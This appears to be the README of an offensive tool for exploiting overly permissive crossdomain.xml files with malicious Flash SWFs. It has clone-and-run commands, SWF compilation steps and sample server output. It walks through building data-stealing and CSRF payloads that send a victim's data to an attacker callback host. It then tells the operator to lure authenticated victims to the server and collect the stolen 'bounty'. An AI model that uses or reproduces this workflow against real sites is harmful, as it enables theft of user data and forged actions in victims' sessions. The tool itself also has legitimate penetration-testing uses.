crossdomain-exploitation-framework
==================================

While not much of a framework just yet, everything you need to exploit overly permissive crossdomain.xml files is here.   

Supported OS
==================================
Kali

OSX

Download and Setup
==================================
```ShellSession
root@kali:~# git clone https://github.com/sethsec/crossdomain-exploitation-framework.git
root@kali:~# cd crossdomain-exploitation-framework
root@kali:~/crossdomain-exploitation-framework# ./SWF-server
```

Sample Output - Installation
==================================
```ShellSession
root@kali:~/crossdomain-exploitation-framework# python SWF-server

**************************************************
*                                                *
*              Welcome to SWF Server!            *
*                                                *
**************************************************

It looks like this is the first run.  We need to set up a few things...

[INSTALL] Creating /opt/flex...
[INSTALL] Downloading Flex (This is a 340MB file)...
[INSTALL] Downloading: http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip Bytes: 343973963
[INSTALL] Extracting Flex to /opt/flex (Takes 5-20 seconds)...
[INSTALL] Creating a self-signed SSL cert...
[INSTALL] Copying http-crossdomain.nse to nmap scripts directory...
[INSTALL] Time to create your own SWF file

     To create your own SWF file:

     1) Chose a template from ./actionscript-templates
     2) Edit the template (or copy and then edit the template)
         a) Specify a page on the vulnerable site that you want your victimn to access:
              Ex: http://vulnerable.com/account/settings
         b) For data stealing SWFs, specify your attacker callback URL:
              Ex: http://attacker/, https://192.168.0.100, or https://www.attacker.com/
         c) For CSRF SWFs, modify the actionscript to extract the information you need
     3) Compile the ActionScript file and drop the SWF to the ./webroot directory (exploit.swf)
         a) /opt/flex/bin/mxmlc ./actionscript-templates/<template>.as --output ./webroot/exploit.swf

     4) Re-run ./SWF-server

root@kali:~/crossdomain-exploitation-framework#
```

Sample Output - SWF creation
==================================
```ShellSession
root@kali:~/crossdomain-exploitation-framework# ls -l actionscript-templates/
total 24
-rw-r--r-- 1 501 staff 1952 Sep 28 17:53 CSRF.as
-rw-r--r-- 1 501 staff 3247 Sep 28 17:53 ExtractCSRFnonceAndSecondItemThenMakePOSTrequest.as
-rw-r--r-- 1 501 staff 2408 Sep 28 17:53 ExtractCSRFnonceChangeEmailAddress.as
-rw-r--r-- 1 501 staff 2734 Sep 28 17:53 ExtractCSRFnonceThenMakePOSTrequest.as
-rw-r--r-- 1 501 staff  985 Oct 10 16:08 README.md
-rw-r--r-- 1 501 staff 1317 Oct 10 16:10 StealData.as
root@kali:~/crossdomain-exploitation-framework/# vi actionscript-templates/StealData.as 
root@kali:~/crossdomain-exploitation-framework/# /opt/flex/bin/mxmlc actionscript-templates/StealData.as --output /root/crossdomain-exploitation-framework/webroot/exploit.swf
Loading configuration file /opt/flex/frameworks/flex-config.xml
/root/crossdomain-exploitation-framework/actionscript-templates/StealData.as: Warning: This compilation unit did not have a factoryClass specified in Frame metadata to load the configured runtime shared libraries. To compile without runtime shared libraries either set the -static-link-runtime-shared-libraries option to true or remove the -runtime-shared-libraries option.

/root/crossdomain-exploitation-framework/webroot/exploit.swf (1085 bytes)
```

Sample Output - Execution
==================================

Once you have compiled your SWF and saved it in the web root, you should run SWF-server:

```ShellSession
root@kali:~/crossdomain-exploitation-framework# ./SWF-server 

**************************************************
*                                                *
*              Welcome to SWF Server!            *
*                                                *
**************************************************



      [SWF-Server] Listening on 443/tcp
      [SWF-Server] Document Root: /root/crossdomain-exploitation-framework/webroot
      [SWF-Server] Version:       0.9.3
      [SWF-Server] Use <Ctrl-C> to stop


 Step #1) Hope that your victim is authenticated with the vulnerable site
 Step #2) Convince your victim to arrive at https://<this-server>/index.html
 Step #3) Collect your bounty at ./bounty/


172.16.214.1 - - [13/Oct/2014 15:39:41] "GET /index.html HTTP/1.1" 200 -
172.16.214.1 - - [13/Oct/2014 15:39:41] "GET /exploit.swf HTTP/1.1" 200 -

*  New bounty file written to disk: 
*  /root/crossdomain-exploitation-framework/bounty/bounty-172.16.214.1-1413229183.71.txt  

172.16.214.1 - - [13/Oct/2014 15:39:43] "POST / HTTP/1.1" 200 -

 ```

# ipay2
